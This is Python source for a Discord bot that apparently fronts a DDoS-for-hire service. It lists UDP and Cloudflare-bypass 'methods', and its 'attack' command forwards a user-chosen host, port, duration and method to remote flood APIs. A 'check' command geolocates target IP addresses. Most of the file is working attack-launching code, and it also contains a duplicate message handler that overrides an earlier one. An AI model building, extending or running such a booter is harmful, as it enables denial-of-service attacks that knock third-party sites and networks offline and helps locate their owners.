import discord
from discord.ext import commands
import requests
from bs4 import BeautifulSoup
import random
from selenium import webdriver


TOKEN = (input("PASTE TOKEN:"))
intents = discord.Intents.all()
intents.typing = False
intents.presences = False

bot = commands.Bot(command_prefix='', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')


options = webdriver.ChromeOptions()
options.add_argument('--headless')  

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    if isinstance(message.channel, discord.DMChannel):
        await message.channel.send(f'Your mother is my friend, {message.author.mention}')
        return
    
@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    color = random.randint(0, 0xFFFFFF) 
    
    if message.content.lower() == 'method':
        response = """
**  
```diff
-L4 METHODS 
``` 
UDP {UDP protocol without encryption.}
```ini
[L7 METHODS]
``` 
ZEUS {Sites & Cloudflare}
BYPASS {Sites & Cloudflare}
Usage:  attack [target] [port] [time] [Method]
  **"""
        embed = discord.Embed(title="List of Methods⚡️", description=response, color=color)
        await message.reply(embed=embed)
        return
    
    await bot.process_commands(message)



@bot.command()
@commands.guild_only()
async def clear(ctx):
    await ctx.channel.purge()
    

@bot.command()
async def join(ctx):
    channel_id = 1050334089749725195  
    channel = bot.get_channel(channel_id)
    
    if channel:
        await channel.connect()
        await ctx.send(f"ok {channel.name}")
    else:
        await ctx.send("ok")
        
@bot.command()
async def check(ctx, *, ip_address: str):
    ip_info = get_ip_info(ip_address)

    if ip_info['status'] == 'fail':
        await ctx.send("Invalid input or unable to fetch information.")
    else:
        color = random.randint(0, 0xFFFFFF)  

        embed = discord.Embed(title="IP Information", color=color)
        embed.add_field(name="IP Address", value=ip_info['query'], inline=False)
        embed.add_field(name="Country", value=ip_info['country'], inline=True)
        embed.add_field(name="City", value=ip_info['city'], inline=True)
        embed.add_field(name="ISP", value=ip_info['isp'], inline=False)
        embed.add_field(name="AS", value=ip_info['as'], inline=False)
        embed.add_field(name="Lat/Long", value=f"{ip_info['lat']}, {ip_info['lon']}", inline=False)

        await ctx.send(embed=embed)
        
def get_ip_info(ip):
    url = f"http://ip-api.com/json/{ip}"
    response = requests.get(url)
    data = response.json()

    return data
    

@bot.command()
@commands.guild_only()
async def attack(ctx, host: str, port: int, attack_time: int, method: str):
    if ctx.channel.id != 1050334089749725195:
        await ctx.send("Please use the command in the correct channel.")
        return

    api_urls = [
    "http://tes/flood?key=jawa",
    "http://tes/flood?key=jawa"
]



    if attack_time > 300:
        await ctx.send("Max Time is 300 Seconds.")
        return

    for api_url in api_urls:
        url = f"{api_url}&target={host}&port={port}&time={attack_time}&method={method}"
        response = requests.get(url)
        
        
        
    if response.status_code == 200:

        color = random.randint(0, 0xFFFFFF)  
        
        avatar_url = f'https://api.multiavatar.com/{random.randint(1, 99)}.png'


        embed = discord.Embed(title="Headshot Request Sent", color=color)
        embed.set_footer(text=f"Request sent by {ctx.author.display_name}", icon_url=avatar_url)
        embed.add_field(name="User", value=ctx.author.mention, inline=True)
        embed.add_field(name="Host", value=host, inline=True)
        embed.add_field(name="Port", value=port, inline=True)
        embed.add_field(name="Headshot Time", value=f"{attack_time} seconds", inline=True)
        embed.add_field(name="Method", value=method, inline=True)
        embed.timestamp = ctx.message.created_at
        
        await ctx.send(embed=embed)
    else:
        await ctx.send("cooldown")


bot.run(TOKEN)
